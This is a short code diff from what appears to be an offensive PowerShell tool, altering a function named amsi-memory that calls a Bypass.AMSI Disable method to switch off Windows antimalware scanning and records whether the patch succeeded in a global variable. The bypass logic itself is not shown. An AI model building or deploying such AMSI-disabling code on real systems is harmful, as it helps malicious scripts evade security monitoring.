@@ -6,8 +6,8 @@ function amsi-memory {
   }
   $res = [Bypass.AMSI]::Disable()
   if ($res -eq 0) {
-      return "Patched"
+      $global:execute = "Patched"
   } else {
-      return "No Patched"
+      $global:execute = "No Patched"
   }
 }
